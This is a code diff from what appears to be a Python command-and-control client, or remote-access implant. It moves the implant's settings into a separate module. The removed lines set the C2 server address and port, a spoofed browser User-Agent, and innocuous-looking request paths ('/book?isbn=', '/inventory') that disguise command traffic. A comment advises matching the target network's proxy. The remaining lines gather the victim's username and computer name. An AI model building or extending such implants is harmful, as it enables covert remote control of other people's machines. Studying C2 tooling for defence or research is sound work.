@@ -6,37 +6,8 @@ from time import sleep, time
 from requests import exceptions, get, post
 from sys import platform
 from os import uname
+from settings import PORT, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
 
-# Keep the User-Agent look like a modern browser
-HEADER = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/557.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Accept": "text/plain"
-}
-
-# Set a proxy to match what your target network will be using, if you know it
-# PROXY = None {"https": "proxy.some-site.com:443"}
-PROXY = None
-
-# Port c2 server listens on
-PORT = 80
-
-# Set the c2 server's IP address or hostname
-C2_SERVER = "localhost"
-
-# Path to use for signifying a command request form a client using HTTP GET
-CMD_REQUEST = "/book?isbn="
-
-# Path to use for signifying a command output from client using HTTP POST
-CMD_RESPONSE = "/inventory"
-
-# POST variable name to use for assigning to command output from a client
-CMD_RESPONSE_KEY = "index"
-
-# Define a sleep delay time in seconds for re-connection attempts
-DELAY = 3
-
-# Obtain unique identifiying information
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
 elif platform == "linux" or platform == "linux2":
